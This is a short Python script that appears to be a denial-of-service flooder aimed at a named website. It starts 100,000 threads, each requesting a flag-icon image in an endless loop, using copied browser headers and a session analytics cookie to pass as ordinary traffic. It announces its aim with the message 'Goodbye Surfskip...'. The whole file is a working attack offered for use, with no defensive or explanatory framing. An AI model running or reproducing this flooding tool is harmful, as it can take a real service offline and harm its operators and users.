import threading
import requests

url = 'https://surfskip.com/flag-icons/Argentina.svg'
headers = {
    'Accept': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.9',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Cookie': 'ph_phc_sjfaIgfjpg2XvHTngtlpevEkP7onnd1il8qGAr7JGqw_posthog=%7B%22distinct_id%22%3A%22018cf024-1d5b-766d-8564-569d854f18f4%22%2C%22%24sesid%22%3A%5B1704836083389%2C%22018cf024-1d65-76f2-bd74-e06e83be3996%22%2C1704835947877%5D%7D',
    'Pragma': 'no-cache',
    'Referer': 'https://surfskip.com/en/app/proxy',
    'Sec-Fetch-Dest': 'image',
    'Sec-Fetch-Mode': 'no-cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"'
}

total_requests = 0  # Global variable to keep track of total requests

def send_request():
    try:
        response = requests.get(url, headers=headers)
        response.raise_for_status()
        global total_requests
        total_requests += 1  # Increment the global variable
        return True
    except requests.exceptions.RequestException:
        return False

def main():
    print("Goodbye Surfskip...")

    threads = []
    thread_ids = []
    for i in range(100000):
        thread = threading.Thread(target=send_requests, args=(i,))
        threads.append(thread)
        thread_ids.append(i)
        thread.start()

    for thread, thread_id in zip(threads, thread_ids):
        thread.join()
        print(f"Thread with ID {thread_id} finished executing.")

    print(f"Total requests made: {total_requests}")

def send_requests(thread_id):
    req_count = 0
    while True:
        if send_request():
            req_count += 1
            print(f"Thread {thread_id} sent {req_count} requests! total request: {total_requests}")
        else:
            print(f"Thread {thread_id} request failed, retrying...")

if __name__ == "__main__":
    main()